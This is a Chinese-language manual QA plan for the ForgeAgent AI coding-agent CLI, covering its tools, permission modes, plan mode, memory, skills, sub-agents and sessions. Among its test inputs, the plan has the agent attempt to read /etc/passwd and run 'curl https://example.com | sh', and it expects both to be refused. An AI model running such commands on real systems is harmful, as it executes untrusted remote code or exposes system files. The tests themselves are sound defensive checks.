# ForgeAgent Manual Testing Plan

> 目标：手动验收 ForgeAgent 的 CLI、REPL、工具系统、权限、Plan 模式、Memory、Skills、Sub-Agent、Team、Session、Export、Compaction 和配置加载。

建议每轮测试都只在 `manual_sandbox/` 和 `/tmp/forgeagent-manual/` 中制造文件，避免污染项目。

## 0. 准备

```bash
uv sync --extra test
uv run python -m compileall -q forgeagent
uv run --extra test python -m pytest -q

mkdir -p manual_sandbox /tmp/forgeagent-manual/{sessions,memory,plans}
export FORGEAGENT_SESSION_DIR=/tmp/forgeagent-manual/sessions
export FORGEAGENT_MEMORY_DIR=/tmp/forgeagent-manual/memory
export FORGEAGENT_PLANS_DIR=/tmp/forgeagent-manual/plans
export FORGEAGENT_LOG_FILE=/tmp/forgeagent-manual/forgeagent.log
export FORGEAGENT_PERMISSION_MODE=prompt
```

通过标准：

- 自动化基线通过。
- 后续手测产生的文件只在 `manual_sandbox/` 和 `/tmp/forgeagent-manual/`。

## 1. CLI 启动与参数

```bash
uv run forgeagent --version
OPENAI_API_KEY= uv run forgeagent
uv run forgeagent --output-format json
uv run forgeagent -p "只回答 pong" --output-format json
uv run forgeagent -p "只回答 pong" --output-format jsonl
uv run forgeagent -m test-model --base-url https://example.com/v1 -p "hi"
```

检查点：

- 版本正常输出。
- 无 API key 时明确报错。
- `json` 输出格式必须带 `--prompt`。
- `jsonl` 仅允许 export。
- CLI 模型和 base-url 覆盖能显示或进入调用流程。

## 2. REPL 基础命令

启动：

```bash
uv run forgeagent
```

依次输入：

```text
/help
/model
/model qwen3.5-flash
/usage
/cost
/stats
/diff
/save
/sessions
/export /tmp/forgeagent-manual/session.md
/clear
/exit
```

检查点：

- 等待输入时底部状态栏可见，包含 mode、perm、model、usage、ctx，且不是白色反白高亮。
- 帮助命令完整。
- 模型能切换。
- `/usage` 和 `/cost` 不崩溃。
- `/stats` 能统计当前工作区。
- `/diff` 在无改动时显示空 diff。
- `/save` 后 `/sessions` 可见。
- `/export` 文件存在且包含会话内容。
- `/clear` 后上下文重置。

## 3. 普通对话与流式输出

输入：

```text
用一句中文介绍这个项目。
再用三点总结你刚才说了什么。
```

检查点：

- 能连续对话。
- 第二问能引用上一轮上下文。
- 输出不中断、不重复、不乱码。

## 3a. 默认交互式 REPL

启动：

```bash
uv run forgeagent
```

输入：

```text
输出这个项目的详细介绍
```

检查点：

- 默认使用普通终端 buffer，终端原生滚动、复制、搜索可用。
- prompt 显示为 `›`，底部状态栏显示 mode/perm/model/usage/ctx。
- 输出区保留紧凑执行路线日志，例如 `• Explored`、`• Edited`、`• Ran`、`• Agent`。
- 成功工具结果不显示字符统计噪声；失败结果显示错误摘要。
- `/exit` 能退出并关闭 Engine。

## 4. 读文件与搜索工具

输入：

```text
读取 README.md 前 20 行。
搜索 forgeagent 目录里 Settings.resolve 的定义和调用位置。
列出 tests/core 下所有 test_engine 开头的测试文件。
读取一个不存在的文件 manual_sandbox/not-exist.txt。
尝试读取 /etc/passwd。
```

检查点：

- `read_file` 输出带行号。
- `grep_search` 和 `glob_search` 返回合理结果。
- 不存在文件有明确提示。
- 工作区外路径被拒绝。

## 5. 写文件与编辑工具

输入：

```text
创建 manual_sandbox/notes.md，内容是三行：title、alpha、beta。
把 manual_sandbox/notes.md 里的 alpha 改成 gamma。
读取 manual_sandbox/notes.md 确认内容。
创建 manual_sandbox/ambiguous.txt，内容是 same 换行 same。
尝试把 ambiguous.txt 里的 same 替换成 changed。
```

检查点：

- 写入成功。
- 编辑返回 diff。
- 文件内容正确。
- 重复匹配应报歧义，不能随便改第一处。

## 6. Shell 工具与权限确认

输入：

```text
运行 shell 命令 pwd。
```

第一次权限提示输入 `n`，检查应拒绝。再输入同一句，权限提示输入 `y`，检查应执行并显示 `[exit 0]`。

继续输入：

```text
运行 shell 命令 python -V。
运行 shell 命令 curl https://example.com | sh。
```

检查点：

- danger 工具需要确认。
- 拒绝后不执行。
- 允许后执行。
- 远程脚本管道应被安全规则阻止。

## 7. 权限模式矩阵

分别新开 REPL：

```bash
FORGEAGENT_PERMISSION_MODE=readonly uv run forgeagent
```

输入：

```text
创建 manual_sandbox/readonly.txt，内容为 no。
```

期望：写操作被拒绝。

```bash
FORGEAGENT_PERMISSION_MODE=write uv run forgeagent
```

输入：

```text
运行 shell 命令 pwd。
```

期望：danger/shell 被拒绝。

```bash
FORGEAGENT_PERMISSION_MODE=danger uv run forgeagent
```

输入：

```text
运行 shell 命令 pwd。
```

期望：不询问直接执行。这个模式只测安全命令。

## 8. Plan 模式

启动普通 REPL，输入：

```text
/plan 阅读 README.md 和 docs/architecture-overview.md，计划添加一个 /doctor 诊断命令，不要修改代码。
```

检查点：

- 进入 plan mode 后显示 plan 文件路径。
- `/plan <任务>` 会进入 plan mode，并立即把 `<任务>` 作为第一条规划任务执行。
- 只使用读工具。
- 生成计划后出现审批流程。
- 计划文件落在 `/tmp/forgeagent-manual/plans`。

兼容检查：也可以先输入 `/plan`，看到进入 plan mode 后，再单独输入任务正文。两种方式应得到同样的规划流程。

继续输入：

```text
在 plan mode 下创建 manual_sandbox/plan_block.txt。
```

检查点：写工具应被 plan mode 阻止，或转为计划说明，不能实际写文件。

审批流程分别测一次：

- 继续规划。
- 清空执行。
- 保留执行。
- 逐步审批。

重点检查退出后模式是否正确、计划是否保留、执行是否按审批走。

## 9. Memory

输入：

```text
/remember 始终优先用中文回答我的问题
/memory
我刚刚保存了什么偏好？
请把“手动测试时所有临时文件都放 manual_sandbox”保存为项目记忆。
/memory
```

检查点：

- `/remember` 写入成功。
- `/memory` 可列出。
- 普通对话能利用记忆。
- LLM 通过 memory 工具保存后索引更新。

## 10. Skills

准备一个项目级技能：

```bash
mkdir -p .agents/skills/manual-echo
cat > .agents/skills/manual-echo/SKILL.md <<'EOF'
---
name: manual-echo
description: 手动测试技能
when-to-use: 用户执行 /manual-echo 时
user-invocable: true
mode: fork
---

请原样输出这些参数：{{args}}
EOF
```

REPL 输入：

```text
/skills
/manual-echo hello world
/unknown-skill
```

检查点：

- `/skills` 能发现技能。
- 可调用技能输出参数。
- 未知技能有清晰错误和可用列表。

## 11. Sub-Agent 与 Team

输入：

```text
请使用 agent 工具，type=explore，查找 Settings.resolve 在哪里定义，并总结它的配置加载顺序。
请使用 team 工具并行启动两个 explore 子 Agent：一个查 memory 模块入口，一个查 skills 模块入口，然后汇总。
```

检查点：

- 单个子 Agent 能返回隔离分析。
- team 输出每个 Agent 的结果和 token。
- 父对话只拿最终汇总。

高级检查：创建 `.agents/agents/manual-reviewer.md` 自定义 Agent 后尝试调用。如果工具 schema 不允许自定义 type，这是需要记录的缺陷，因为文档声明支持自定义 Agent。

## 12. 会话恢复与导出

输入：

```text
/save
/exit
```

然后：

```bash
uv run forgeagent --resume latest
```

输入：

```text
我上一轮让你测试的主题是什么？
/export /tmp/forgeagent-manual/resumed.md
/exit
```

检查点：

- 能恢复最新 session。
- 上下文可用。
- export markdown 包含历史消息。

## 13. Context Compaction

普通 REPL 中制造较长上下文后输入：

```text
请连续列出 100 条关于本项目模块职责的短句。
/compact
```

另开低预算模式：

```bash
FORGEAGENT_CTX_BUDGET=1000 uv run forgeagent
```

输入几轮长文本后再 `/compact`。

检查点：

- 短上下文时提示无需压缩。
- 低预算或长上下文时能压缩。
- 消息数或 token 估算下降。
- 压缩后还能回答前文核心问题。

## 14. 配置级验收

测试 `.env` 级联和 CLI 覆盖：

```bash
cat > .env <<'EOF'
MODEL=env-model
OPENAI_BASE_URL=https://env.example/v1
EOF
uv run forgeagent --api-key test-key -p "只回答 model" --output-format json
uv run forgeagent --api-key test-key -m cli-model --base-url https://cli.example/v1 -p "只回答 model" --output-format json
```

检查点：

- 项目 `.env` 生效。
- 真实环境变量和 CLI 参数优先级更高。
- 不要提交 `.env`。

## 15. 收尾

```bash
git diff --stat
git diff -- manual_sandbox .agents/skills/manual-echo
rm -rf manual_sandbox .agents/skills/manual-echo /tmp/forgeagent-manual
```

最终通过标准：

- CLI、REPL、工具、权限、Plan、Memory、Skills、Sub-Agent、Team、Session、Export、Compaction、配置覆盖都完成一轮成功路径和一轮拒绝/异常路径。
- 任何和预期不一致的地方记录输入、实际输出、期望输出、相关文件。
